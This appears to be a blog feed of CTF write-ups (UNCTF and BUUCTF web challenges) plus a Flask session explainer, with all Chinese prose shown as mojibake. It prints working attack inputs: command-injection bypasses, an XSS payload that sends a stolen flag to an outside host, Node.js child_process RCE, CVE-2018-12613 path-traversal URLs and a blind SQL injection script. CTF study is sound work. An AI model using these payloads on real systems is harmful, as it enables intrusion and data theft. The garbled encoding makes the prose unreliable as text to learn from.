ä¸‰ä¸ªåæ–œæ æ‰èƒ½è½¬ä¹‰åæ–œæ ï¼Œè¿™é‡Œå¯¹ | è¿›è¡Œäº†è½¬ä¹‰ä»è€Œé€ æˆåå¼•å·é€ƒé€¸ã€‚</p><pre><code>&lt;?php$a = &quot;`dir`&quot;;if (preg_match(&quot;/\&apos;|\&quot;|,|;|\\|\`/is&quot;,$a))    $a = &quot;&quot;;    $a =&apos;&quot;&apos; . $a . &apos;&quot;&apos;;    var_dump($a);string(7) &quot;&quot;`dir`&quot;&quot;</code></pre><p>å¯ä»¥çœ‹åˆ°åå¼•å·æˆåŠŸé€ƒé€¸ã€‚</p><p>æˆ‘ä»¬åˆ°é¢˜ç›®ä¸­å°è¯•åˆ—ç›®å½•ï¼Œæ²¡æœ‰ <code>ls</code> å¯ä»¥ç”¨ <code>dir</code></p><pre><code>?a=`dir%20/`å“åº”ï¼šbin dev home lib64 mnt proc run srv sys usr boot etc lib media opt root sbin start.sh tmp var: cannot open `bin dev home lib64\011mnt proc run\011 srv\011 sys\011usr\012boot etc lib\011 media\011opt root sbin start.sh tmp\011var&apos; (No such file or directory) : cannot open `&apos; (No such file or directory) </code></pre><p>æŸ¥æ‰¾flag </p><pre><code>?a=`/b??/gr??%20-R%20unctf`å“åº”ï¼š.F1jh_/h3R3_1S_your_F1A9.txt:unctf{86dfe85d7c5842c5c04adae104193ee1}: cannot open `.F1jh_/h3R3_1S_your_F1A9.txt:unctf{86dfe85d7c5842c5c04adae104193ee1}&apos; (No such file or directory) : cannot open `&apos; (No such file or directory) </code></pre><h2 id="another-way"><a href="#another-way" class="headerlink" title="another way"></a>another way</h2><p>ç¬¬äºŒä¸ªæ­£åˆ™ <code>\\|\n</code> ä¼šè§£é‡Šä¸ºç«–çº¿å’Œæ¢è¡Œï¼Œæ‰€ä»¥åˆ©ç”¨ <code>%0a</code> è¿›è¡Œæ¢è¡Œç»•è¿‡ï¼ŒåŒæ—¶æœ«å°¾ä½¿ç”¨ <code>%20#</code> æ¥ç»ˆæ­¢å‘½ä»¤å¤„ç†åŒå¼•å·</p><pre><code>?a=\&amp;b=%0a/???/gr?p%20-R%20ctf%20%23æ•ˆæœæ˜¯file&quot;\&quot;&quot;/???/gr?p -R ctf #&quot;</code></pre><h2 id="easy-xss"><a href="#easy-xss" class="headerlink" title="easy xss"></a>easy xss</h2><p>åœ¨ç•™è¨€æ¿å¤„æäº¤ xss å‘ç°èƒ½å¤Ÿè§¦å‘ï¼Œè®¿é—®å‚¨å­˜çš„è·¯å¾„å‘ç°ä¸€ä¸ªæ¥å£</p><pre><code>http://112.74.37.15:8010/index.php/treehole/view?id=5dcd1d7bd11a4</code></pre><p>æ­¤æ—¶çš„è¯·æ±‚å¤´é‡Œå¸¦ä¸Šäº† <code>XMLHttpRequest</code> ï¼ŒåŒæ—¶ä¸å¸¦å‚æ•°è®¿é—®æ—¶å¾—åˆ° debug é¡µé¢ï¼Œå¯ä»¥çœ‹åˆ° XHRè¯·æ±‚å¸¦ä¸Šäº† cookie ï¼Œäºæ˜¯æˆ‘ä»¬æ„é€  XHR è¯·æ±‚</p><pre><code>&lt;img src=&apos;/efefefe&apos; onerror=&quot;xmlhttp=newXMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){location.href=&apos;http://xssye.com/kOaI/?flag=&apos;xmlhttp.responseText.match(&apos;flag\\{(.\*?)\\}&apos;)[1]}};xmlhttp.open(&apos;GET&apos;,&apos;/index.php/treehole/view?id=&apos;,true);xmlhttp.send(&apos;&apos;);&quot;/\&gt;</code></pre><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>æŸ¥çœ‹æºç å‘ç°å„ä¸ªæ¥å£</p><pre><code>      switch (e.cmd) {        case &apos;name&apos;:          this.nickname = e.msg,          this.kesshoubanMsg(`Change nickname ${this.nickname        }         success!`);        break;      case &apos;error&apos;:        this.kesshoubanMsg(`ğŸ™${e.msg    }    `);    break;  case &apos;calc&apos;:    this.kesshoubanMsg(`${e.msg  }  `);  break;case &apos;flag&apos;:  this.kesshoubanMsg(`${e.msg}`);</code></pre><p>ä¿®æ”¹å®Œåå­—åæµ‹è¯• <code>/calc 1+1</code> å‘ç°æˆåŠŸæ‰§è¡Œï¼Œå­˜åœ¨ä»£ç æ³¨å…¥å‚è€ƒ<a href="http://qnkcdz0.xyz/2019/06/24/Node-js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Beval%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">http://qnkcdz0.xyz/2019/06/24/Node-js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Beval%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a></p><p>å°è¯• <code>/calc require(&#39;child_process&#39;).execSync(&#39;cat$IFS/flag&#39;).toString();</code> å…¶ä¸­ç©ºæ ¼è¿‡æ»¤ç»•è¿‡ $IFS ï¼ŒåŒæ—¶Syncé‡‡ç”¨éé˜»å¡è¿”å›ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask-session</title>
      <link href="/2019/11/06/flask-session/"/>
      <url>/2019/11/06/flask-session/</url>
      
        <content type="html"><![CDATA[<h1 id="flask-session"><a href="#flask-session" class="headerlink" title="flask-session"></a>flask-session</h1><p>11/6/2019 8:43:45 PM </p><p>æ¬è¿æ–‡ç«  <a href="https://cizixs.com/2017/03/08/flask-insight-session/" target="_blank" rel="noopener">https://cizixs.com/2017/03/08/flask-insight-session/</a></p><p><strong>sessionæ˜¯å¦‚ä½•ä½¿ç”¨çš„ï¼š</strong></p><p>cookieå’Œsessionç»“åˆä½¿ç”¨ï¼šwebå¼€å‘å‘å±•è‡³ä»Šï¼Œcookieå’Œsessionçš„ä½¿ç”¨å·²ç»å‡ºç°äº†ä¸€äº›éå¸¸æˆç†Ÿçš„æ–¹æ¡ˆã€‚åœ¨å¦‚ä»Šçš„å¸‚åœºæˆ–è€…ä¼ä¸šé‡Œï¼Œä¸€èˆ¬æœ‰ä¸¤ç§å­˜å‚¨æ–¹å¼ï¼š</p><ul><li><p>å­˜å‚¨åœ¨æœåŠ¡ç«¯ï¼šé€šè¿‡cookieå­˜å‚¨ä¸€ä¸ª<code>session_id</code>ï¼Œç„¶åå…·ä½“çš„æ•°æ®åˆ™æ˜¯ä¿å­˜åœ¨sessionä¸­ã€‚å¦‚æœç”¨æˆ·å·²ç»ç™»å½•ï¼Œåˆ™æœåŠ¡å™¨ä¼šåœ¨cookieä¸­ä¿å­˜ä¸€ä¸ª<code>session_id</code>ï¼Œä¸‹æ¬¡å†æ¬¡è¯·æ±‚çš„æ—¶å€™ï¼Œä¼šæŠŠè¯¥<code>session_id</code>æºå¸¦ä¸Šæ¥ï¼ŒæœåŠ¡å™¨æ ¹æ®session_idåœ¨sessionåº“ä¸­è·å–ç”¨æˆ·çš„sessionæ•°æ®ã€‚å°±èƒ½çŸ¥é“è¯¥ç”¨æˆ·åˆ°åº•æ˜¯è°ï¼Œä»¥åŠä¹‹å‰ä¿å­˜çš„ä¸€äº›çŠ¶æ€ä¿¡æ¯ã€‚è¿™ç§ä¸“ä¸šæœ¯è¯­å«åš<code>server side session</code>ã€‚</p></li><li><p>å°†sessionæ•°æ®åŠ å¯†ï¼Œç„¶åå­˜å‚¨åœ¨cookieä¸­ã€‚è¿™ç§ä¸“ä¸šæœ¯è¯­å«åš<code>client side session</code>ã€‚flaské‡‡ç”¨çš„å°±æ˜¯è¿™ç§æ–¹å¼ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥æ›¿æ¢æˆå…¶ä»–å½¢å¼ã€‚</p></li></ul><p>åœ¨è§£æ session çš„å®ç°ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆä»‹ç»ä¸€ä¸‹ session æ€ä¹ˆä½¿ç”¨ã€‚session å¯ä»¥çœ‹åšæ˜¯åœ¨ä¸åŒçš„è¯·æ±‚ä¹‹é—´ä¿å­˜æ•°æ®çš„æ–¹æ³•ï¼Œå› ä¸º HTTP æ˜¯æ— çŠ¶æ€çš„åè®®ï¼Œä½†æ˜¯åœ¨ä¸šåŠ¡åº”ç”¨ä¸Šæˆ‘ä»¬å¸Œæœ›çŸ¥é“ä¸åŒè¯·æ±‚æ˜¯å¦æ˜¯åŒä¸€ä¸ªäººå‘èµ·çš„ã€‚æ¯”å¦‚è´­ç‰©ç½‘ç«™åœ¨ç”¨æˆ·ç‚¹å‡»è¿›å…¥è´­ç‰©è½¦çš„æ—¶å€™ï¼ŒæœåŠ¡å™¨éœ€è¦çŸ¥é“æ˜¯å“ªä¸ªç”¨æˆ·æ‰§è¡Œäº†è¿™ä¸ªæ“ä½œã€‚</p><p>åœ¨ flask ä¸­ä½¿ç”¨ session ä¹Ÿå¾ˆç®€å•ï¼Œåªè¦ä½¿ç”¨ from flask import session å¯¼å…¥è¿™ä¸ªå˜é‡ï¼Œåœ¨ä»£ç ä¸­å°±èƒ½ç›´æ¥é€šè¿‡è¯»å†™å®ƒå’Œ session äº¤äº’ã€‚</p><pre><code>from flask import Flask, session, escape, requestapp = Flask(__name__)app.secret_key = &apos;please-generate-a-random-secret_key&apos;@app.route(&quot;/&quot;)def index():    if &apos;username&apos; in session:        return &apos;hello, {}\n&apos;.format(escape(session[&apos;username&apos;]))    return &apos;hello, stranger\n&apos;@app.route(&quot;/login&quot;, methods=[&apos;POST&apos;])def login():    session[&apos;username&apos;] = request.form[&apos;username&apos;]    return &apos;login success&apos;if __name__ == &apos;__main__&apos;:    app.run(host=&apos;0.0.0.0&apos;, port=5000, debug=True)</code></pre><p>ä¸Šé¢è¿™æ®µä»£ç æ¨¡æ‹Ÿäº†ä¸€ä¸ªéå¸¸ç®€å•çš„ç™»é™†é€»è¾‘ï¼Œç”¨æˆ·è®¿é—® <code>POST /login</code> æ¥ç™»é™†ï¼Œåé¢è®¿é—®é¡µé¢çš„æ—¶å€™ <code>GET /</code>ï¼Œä¼šè¿”å›è¯¥ç”¨æˆ·çš„åå­—</p><p>ç›´æ¥è®¿é—®ï¼š</p><pre><code>GET / HTTP/1.1Accept: */*Accept-Encoding: gzip, deflateHost: 127.0.0.1:5000User-Agent: HTTPie/0.8.0HTTP/1.0 200 OKContent-Length: 14Content-Type: text/html; charset=utf-8Date: Wed, 01 Mar 2017 04:22:18 GMTServer: Werkzeug/0.11.2 Python/2.7.10hello stranger</code></pre><p>ç”¨æˆ·åcizixs æ¨¡æ‹Ÿç™»å½•ï¼š</p><pre><code>POST /login HTTP/1.1Accept: */*Accept-Encoding: gzip, deflateContent-Length: 15Content-Type: application/x-www-form-urlencoded; charset=utf-8Host: 127.0.0.1:5000User-Agent: HTTPie/0.8.0username=cizixsHTTP/1.0 200 OKContent-Length: 13Content-Type: text/html; charset=utf-8Date: Wed, 01 Mar 2017 04:20:54 GMTServer: Werkzeug/0.11.2 Python/2.7.10Set-Cookie: session=eyJ1c2VybmFtZSI6ImNpeml4cyJ9.C5fdpg.fqm3FTv0kYE2TuOyGF1mx2RuYQ4; HttpOnly; Path=/login success</code></pre><p>æœ€é‡è¦çš„æ˜¯æˆ‘ä»¬çœ‹åˆ° response ä¸­æœ‰ <code>Set-Cookie</code> çš„å¤´éƒ¨ï¼Œcookie çš„é”®æ˜¯ <code>session</code></p><p>è¿™æ¬¡è¯·æ±‚æˆ‘ä»¬å¸¦ä¸Šä¸Šæ¬¡çš„ cookie è®¿é—®ï¼š</p><pre><code>GET / HTTP/1.1Accept: */*Accept-Encoding: gzip, deflateCookie: session=eyJ1c2VybmFtZSI6ImNpeml4cyJ9.C5fevg.LE03yEZDWTUMQW-nNkTr1zBEhKkHost: 127.0.0.1:5000User-Agent: HTTPie/0.8.0HTTP/1.0 200 OKContent-Length: 11Content-Type: text/html; charset=utf-8Date: Wed, 01 Mar 2017 04:25:46 GMTServer: Werkzeug/0.11.2 Python/2.7.10Set-Cookie: session=eyJ1c2VybmFtZSI6ImNpeml4cyJ9.C5feyg.sfFCDIqfef4i8cvxUClUUGQNcHA; HttpOnly; Path=/hellocizixs</code></pre><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆåŠŸçš„ä¸é€šè¿‡ç”¨æˆ·åç™»é™†ã€‚</p><p>æ€»ç»“ä¸€ä¸‹ï¼šsession æ˜¯é€šè¿‡åœ¨å®¢æˆ·ç«¯è®¾ç½® cookie å®ç°çš„ï¼Œæ¯æ¬¡å®¢æˆ·ç«¯å‘é€è¯·æ±‚çš„æ—¶å€™ä¼šé™„å¸¦ç€æ‰€æœ‰çš„ cookieï¼Œè€Œé‡Œé¢ä¿å­˜ç€ä¸€äº›é‡è¦çš„ä¿¡æ¯ï¼ˆæ¯”å¦‚è¿™é‡Œçš„ç”¨æˆ·ä¿¡æ¯ï¼‰ï¼Œè¿™æ ·æœåŠ¡å™¨ç«¯å°±èƒ½çŸ¥é“å®¢æˆ·ç«¯çš„ä¿¡æ¯ï¼Œç„¶åæ ¹æ®è¿™äº›æ•°æ®åšå‡ºå¯¹åº”çš„åˆ¤æ–­ï¼Œå°±å¥½åƒä¸åŒè¯·æ±‚ä¹‹é—´æ˜¯æœ‰è®°å¿†çš„ã€‚</p><p><strong>è¯·æ±‚è¿‡ç¨‹</strong></p><ul><li>è¯·æ±‚è¿‡æ¥çš„æ—¶å€™ï¼Œflask ä¼šæ ¹æ® cookie ä¿¡æ¯åˆ›å»ºå‡º session å˜é‡ï¼ˆå¦‚æœ cookie ä¸å­˜åœ¨ï¼Œè¿™ä¸ªå˜é‡æœ‰å¯èƒ½ä¸ºç©ºï¼‰ï¼Œä¿å­˜åœ¨è¯¥è¯·æ±‚çš„ä¸Šä¸‹æ–‡ä¸­</li><li>è§†å›¾å‡½æ•°å¯ä»¥è·å– session ä¸­çš„ä¿¡æ¯ï¼Œå®ç°è‡ªå·±çš„é€»è¾‘å¤„ç†</li><li>flask ä¼šåœ¨å‘é€ response çš„æ—¶å€™ï¼Œæ ¹æ® session çš„å€¼ï¼ŒæŠŠå®ƒå†™å›åˆ° cookie ä¸­</li></ul><p>æ³¨æ„ï¼šsession å’Œ cookie çš„è½¬åŒ–è¿‡ç¨‹ä¸­ï¼Œåº”è¯¥è€ƒè™‘åˆ°å®‰å…¨æ€§ï¼Œä¸ç„¶ç›´æ¥ä½¿ç”¨ä¼ªé€ çš„ cookie ä¼šæ˜¯ä¸ªå¾ˆå¤§çš„å®‰å…¨éšæ‚£ã€‚</p><p><strong>åŠ å¯†session</strong></p><p>æ¬è¿<a href="https://www.leavesongs.com/PENETRATION/client-session-security.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></p><p>flask å¤„ç† session å®‰å…¨æ€§é—®é¢˜æ—¶åœ¨ä»£ç ä¸­æ–°å»ºäº† <code>URLSafeTimedSerializer</code> ç±» ï¼Œç”¨å®ƒçš„dumpsæ–¹æ³•å°†ç±»å‹ä¸ºå­—å…¸çš„ <code>session</code> å¯¹è±¡åºåˆ—åŒ–æˆå­—ç¬¦ä¸²ï¼Œç„¶åç”¨ <code>response.set_cookie</code> å°†æœ€åçš„å†…å®¹ä¿å­˜åœ¨cookieä¸­ã€‚ </p><p><code>URLSafeTimedSerializer</code> åšäº†ä»€ä¹ˆï¼Ÿä¸»è¦ç»è¿‡å‡ æ­¥</p><ul><li>json.dumps å°†å¯¹è±¡è½¬æ¢æˆjsonå­—ç¬¦ä¸²ï¼Œä½œä¸ºæ•°æ®</li><li>å¦‚æœæ•°æ®å‹ç¼©åé•¿åº¦æ›´çŸ­ï¼Œåˆ™ç”¨zlibåº“è¿›è¡Œå‹ç¼©</li><li>å°†æ•°æ®ç”¨base64ç¼–ç </li><li>é€šè¿‡hmacç®—æ³•è®¡ç®—æ•°æ®çš„ç­¾åï¼Œå°†ç­¾åé™„åœ¨æ•°æ®åï¼Œç”¨â€œ.â€åˆ†å‰²</li></ul><p>ç¬¬4æ­¥å°±è§£å†³äº†ç”¨æˆ·ç¯¡æ”¹sessionçš„é—®é¢˜ï¼Œå› ä¸ºåœ¨ä¸çŸ¥é“ <code>secret_key</code> çš„æƒ…å†µä¸‹ï¼Œæ˜¯æ— æ³•ä¼ªé€ ç­¾åçš„ã€‚æ³¨æ„åˆ°ï¼Œåœ¨ç¬¬4æ­¥ä¸­ï¼Œflaskä»…ä»…å¯¹æ•°æ®è¿›è¡Œäº†ç­¾åã€‚ä¼—æ‰€å‘¨çŸ¥çš„æ˜¯ï¼Œç­¾åçš„ä½œç”¨æ˜¯é˜²ç¯¡æ”¹ï¼Œè€Œæ— æ³•é˜²æ­¢è¢«è¯»å–ã€‚è€Œflaskå¹¶æ²¡æœ‰æä¾›åŠ å¯†æ“ä½œï¼Œæ‰€ä»¥å…¶ session çš„å…¨éƒ¨å†…å®¹éƒ½æ˜¯å¯ä»¥åœ¨å®¢æˆ·ç«¯è¯»å–çš„ï¼Œè¿™å°±å¯èƒ½é€ æˆä¸€äº›å®‰å…¨é—®é¢˜ã€‚</p><p><strong>è§£å¯†session</strong></p><p>æœ‰æ—¶å€™åœ¨å¼€å‘æˆ–è€…è°ƒè¯•çš„è¿‡ç¨‹ä¸­ï¼Œéœ€è¦äº†è§£ cookie ä¸­ä¿å­˜çš„åˆ°åº•æ˜¯ä»€ä¹ˆå€¼ï¼Œå¯ä»¥é€šè¿‡æ‰‹åŠ¨è§£æå®ƒçš„å€¼ã€‚session åœ¨ cookie ä¸­çš„å€¼ï¼Œæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç”±å¥å·åˆ†å‰²æˆä¸‰ä¸ªéƒ¨åˆ†ã€‚ç¬¬ä¸€éƒ¨åˆ†æ˜¯ base64 åŠ å¯†çš„æ•°æ®ï¼Œç¬¬äºŒéƒ¨åˆ†æ˜¯æ—¶é—´æˆ³ï¼Œç¬¬ä¸‰éƒ¨åˆ†æ˜¯æ ¡éªŒä¿¡æ¯ã€‚</p><p>å‰é¢ä¸¤éƒ¨åˆ†çš„å†…å®¹å¯ä»¥é€šè¿‡ä¸‹é¢çš„æ–¹å¼è·å–ï¼Œä»£ç ä¹Ÿå¯ç›´è§‚ï¼Œå°±ä¸ç»™å‡ºè§£é‡Šäº†ï¼š</p><pre><code>In [1]: from itsdangerous import *In [2]: s = &apos;eyJ1c2VybmFtZSI6ImNpeml4cyJ9.C5fdpg.fqm3FTv0kYE2TuOyGF1mx2RuYQ4&apos;In [3]: data, timstamp, secret = s.split(&apos;.&apos;)In [4]: base64_decode(data)Out[4]: &apos;{&quot;username&quot;:&quot;cizixs&quot;}&apos;In [5]: bytes_to_int(base64_decode(timstamp))Out[5]: 194502054In [7]: time.strftime(&apos;%Y-%m-%d %H:%I%S&apos;, time.localtime(194502054+EPOCH))Out[7]: &apos;2017-03-01 12:1254&apos;</code></pre><p><strong>sessionä½¿ç”¨</strong></p><p>ä¸Šé¢çœ‹åˆ° session å…¶å®å°±åƒä¸€ä¸ªå­—å…¸ï¼Œæˆ‘ä»¬ä½¿ç”¨çš„æ—¶å€™å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼š</p><pre><code>session[&apos;name&apos;] = name</code></pre>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF åˆ·é¢˜è®°å½•</title>
      <link href="/2019/10/23/BUUCTF-WP/"/>
      <url>/2019/10/23/BUUCTF-WP/</url>
      
        <content type="html"><![CDATA[<h1 id="BUUCTF-wp"><a href="#BUUCTF-wp" class="headerlink" title="BUUCTF  wp"></a>BUUCTF  wp</h1><p>10/23/2019 2:43:09 PM </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Warm-up"><a href="#Warm-up" class="headerlink" title="Warm up"></a>Warm up</h3><p>æŸ¥çœ‹æºç </p><pre><code> &lt;?php    highlight_file(__FILE__);    class emmm    {        public static function checkFile(&amp;$page)        {            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];            if (! isset($page) || !is_string($page)) {                echo &quot;you can&apos;t see it&quot;;                return false;            }            if (in_array($page, $whitelist)) {                return true;            }            $_page = mb_substr(                $page,                0,                mb_strpos($page . &apos;?&apos;, &apos;?&apos;)            );            if (in_array($_page, $whitelist)) {                return true;            }            $_page = urldecode($page);            $_page = mb_substr(                $_page,                0,                mb_strpos($_page . &apos;?&apos;, &apos;?&apos;)            );            if (in_array($_page, $whitelist)) {                return true;            }            echo &quot;you can&apos;t see it&quot;;            return false;        }    }    if (! empty($_REQUEST[&apos;file&apos;])        &amp;&amp; is_string($_REQUEST[&apos;file&apos;])        &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;])    ) {        include $_REQUEST[&apos;file&apos;];        exit;    } else {        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;    }  ?&gt; </code></pre><p>å­˜åœ¨ <code>phpmyadmin 4.8.1</code> è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ <code>cve-2018-12613</code></p><blockquote><p>mb_strpos â€” æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®</p><p>mb_substr â€” è·å–éƒ¨åˆ†å­—ç¬¦ä¸²</p></blockquote><p>å› ä¸ºè€ƒè™‘åˆ° <code>file</code> å¯èƒ½å¸¦å‚æ•°çš„é—®é¢˜æ‰€ä»¥å…ˆè¿›è¡Œäº†ä¸€æ¬¡ <code>mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</code> ï¼Œå¦‚æœè¿™é‡Œæ¥ä¸‹æ¥çš„åˆ¤æ–­é€šè¿‡åˆ™ç›´æ¥è¿”å› <code>true</code> ã€‚å¦‚æœå¤±è´¥åˆ™å¯¹è¿”å›çš„ç»“æœè¿›è¡Œä¸€æ¬¡ <code>urldecode</code> ï¼Œæˆ‘ä»¬çŸ¥é“æµè§ˆå™¨ä¼šè‡ªåŠ¨å°†ä¼ è¾“çš„æ•°æ®è¿›è¡Œä¸€æ¬¡è§£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼ å…¥äºŒæ¬¡ç¼–ç çš„ <code>?-&gt;%253F</code> ä¹‹åä¼šç»è¿‡ä¸¤æ¬¡è§£ç å¾—åˆ° <code>?</code> ,ä»è€Œä½¿è¿”å› <code>true</code> .åœ¨ <code>checkfile</code> è¿”å› <code>true</code> ä¹‹åæˆ‘ä»¬å°±æœ‰äº†ç›®å½•ç©¿è¶ŠåŒ…å«æ–‡ä»¶ã€‚</p><p>æˆ‘ä»¬æœ‰ä¸¤ç§æ–¹æ³•:</p><pre><code>?file=hint.php?../../../../../ffffllllaaaaggggfile=hint.php%253f../../../../../ffffllllaaaagggg</code></pre><h2 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h2><p>æ‰“å¼€é¡µé¢å‘ç°ä¸‰ä¸ªé“¾æ¥ï¼Œå†…å®¹å¦‚ä¸‹</p><pre><code>/flag.txt                //flag in /fllllllllllllag/welcome.txt            //render/hints.txt                //md5(cookie_secret+md5(filename))</code></pre><p>åº”è¯¥æ˜¯æ¨¡æ¿æ³¨å…¥ï¼Œè€Œä¸”éœ€è¦ cookie_secret .æŠ“åŒ…å¹¶æ²¡æœ‰æŠ“åˆ° cookie </p><p>è§‚å¯Ÿé“¾æ¥ï¼š <code>file?filename=/flag.txt&amp;filehash=07c1e7d13389a10b75c75c9884c867fb</code> æˆ‘ä»¬ç›´æ¥è®¿é—®/fllllllllllllag æŠ¥é”™ <code>/error?msg=Error</code> ï¼Œåœ¨error è¿™é‡Œå°è¯• SSTIï¼š <code>error?msg=1</code> å¯ä»¥æ‰§è¡Œé™æ€è¡¨è¾¾å¼ï¼Œä½†æ˜¯ä¸èƒ½åšè¿ç®—ã€‚</p><p>åœ¨Tornadoçš„å‰ç«¯é¡µé¢æ¨¡æ¿ä¸­ï¼ŒTornadoæä¾›äº†ä¸€äº›å¯¹è±¡åˆ«åæ¥å¿«é€Ÿè®¿é—®å¯¹è±¡</p><pre><code>1 &lt;title&gt;2     {{ escape(handler.settings["blog_title"]) }}3 &lt;/title&gt;</code></pre><p>ä½†æ˜¯å¥‡æ€ªçš„æ˜¯RequestHandlerä¸­å¹¶æ²¡æœ‰settingsè¿™ä¸ªå±æ€§ï¼Œä¸RequestHandlerå…³è”çš„Applicationå¯¹è±¡ï¼ˆRequestion.applicationï¼‰æ‰æœ‰settingè¿™ä¸ªå±æ€§ï¼åæ¥é‡æ–°ç¿»äº†ä¸€ä¸‹æ–‡æ¡£ï¼Œå‘ç°åˆæ˜¯ä¸€ä¸ªåˆ«åã€‚</p><pre><code>RequestHandler.settingsAn alias for self.application.settings.</code></pre><p>handler æŒ‡å‘RequestHandler</p><p>è€ŒRequestHandler.settingsåˆæŒ‡å‘self.application.settings</p><p>æ‰€æœ‰handler.settingså°±æŒ‡å‘RequestHandler.application.settingsäº†ï¼</p><p>æ‰€ä»¥å½“æˆ‘ä»¬è®¿é—® <code>RequestHandler.application.settings</code> å¤±è´¥æ—¶ï¼Œæˆ‘ä»¬è®¿é—® <code>handler.settings</code> å¾—åˆ° <code>secret_key</code> ,ä¹‹åä½¿ç”¨è„šæœ¬è¿›è¡Œ md5åŠ å¯†ä¹‹åè®¿é—®å³å¯ï¼š</p><pre><code>import hashlibdef md5value(s):    md5 = hashlib.md5()    md5.update(s.encode())    return md5.hexdigest()def mdfive2():    filename = &apos;/fllllllllllllag&apos;    cookie = r&quot;M)Z.&gt;}{O]lYIp(oW7$dc132uDaK&lt;C%wqj@PA![VtR#geh9UHsbnL_+mT5N~J84*r&quot;    #print(md5value(filename))    # print(md5value(&apos;*c].)Y!x&lt;kr1e2_oQ(zO6Xd5D9ZKw7IPCs#4h~R-JFa3Vp8B0N&gt;%+WgjHbvfM@[U&apos;))    # print(&apos;&apos;+md5value(filename))    print(md5value(cookie + md5value(filename)))#hints md5(cookie_secret+md5(filename))mdfive2()</code></pre><h2 id="CISCN-hack-world"><a href="#CISCN-hack-world" class="headerlink" title="CISCN-hack_world"></a>CISCN-hack_world</h2><p>è¿›å…¥é¶æœºï¼Œçœ‹åˆ°ï¼š</p><pre><code>All You Want Is In Table &apos;flag&apos; and the column is &apos;flag&apos;Now, just give the id of passage</code></pre><p>è¾“å…¥0ï¼Œ1ï¼Œ2 åˆ†åˆ«æœ‰ä¸åŒå›æ˜¾ï¼Œè¾“å…¥éƒ¨åˆ†å…³é”®å­—æ˜¾ç¤º <code>bool(false)</code> ,åº”è¯¥æ˜¯å¸ƒå°”ç›²æ³¨ã€‚åœ¨bpé‡ŒFUZZï¼Œ<code>orã€andã€/*ã€unionã€ç©ºæ ¼</code>ç­‰éƒ½è¢«è¿‡æ»¤äº†ã€‚</p><p>ç›´æ¥ <code>select flag from flag</code> æŸ¥è¯¢è¢«è¿‡æ»¤ï¼Œç»•è¿‡ç©ºæ ¼å¯ä»¥ç”¨æ‹¬å· <code>select(flag)from(flag)</code> </p><p>ç”¨äºŒåˆ†æ³•çŒœè§£åå­—</p><pre><code>import requestsimport timeurl = &apos;http://be659fb8-1739-4a9f-9f9e-8e2be1e33ce6.node3.buuoj.cn/index.php&apos;data = {&quot;id&quot;:&quot;&quot;}flag = &apos;flag{&apos;i = 6while True:    begin = 32    end = 126    tmp = (begin+end)//2    while begin&lt;end:        print(begin,tmp,end)        time.sleep(1)        data[&quot;id&quot;] = &quot;if(ascii(substr((select(flag)from(flag)),{},1))&gt;{},1,2)&quot;.format(i,tmp)        r = requests.post(url,data=data)        if &apos;Hello&apos; in r.text:            begin = tmp+1            tmp = (begin+end)//2        else:            end = tmp            tmp = (begin+end)//2    flag+=chr(tmp)    print(flag)    i+=1    if flag[-1]==&apos;}&apos;:        break</code></pre><h2 id="HCTF-admin"><a href="#HCTF-admin" class="headerlink" title="HCTF admin"></a>HCTF admin</h2><p>11/6/2019 8:43:40 PM </p><h3 id="flask-session-ä¼ªé€ "><a href="#flask-session-ä¼ªé€ " class="headerlink" title="flask-session ä¼ªé€ "></a>flask-session ä¼ªé€ </h3><p>ä»æºç å¾—åˆ°æç¤ºä¸‹è½½åˆ°äº†æºç </p><p>è´´ä¸€éƒ¨åˆ†ä»£ç ï¼š</p><pre><code>index.html{% if current_user.is_authenticated and session['name'] == 'admin' %}<h1 class="nav">hctf{xxxxxxxxx}</h1>{% endif %}&lt;!-- you are not admin --&gt;&lt;h1 class=&quot;nav&quot;&gt;Welcome to hctf&lt;/h1&gt;config.pyimport osclass Config(object):    SECRET_KEY = os.environ.get(&apos;SECRET_KEY&apos;) or &apos;ckj123&apos;    SQLALCHEMY_DATABASE_URI = &apos;mysql+pymysql://root:adsl1234@db:3306/test&apos;    SQLALCHEMY_TRACK_MODIFICATIONS = Trueroutes.py/change@app.route(&apos;/change&apos;, methods = [&apos;GET&apos;, &apos;POST&apos;])def change():    if not current_user.is_authenticated:        return redirect(url_for(&apos;login&apos;))    form = NewpasswordForm()    if request.method == &apos;POST&apos;:        name = 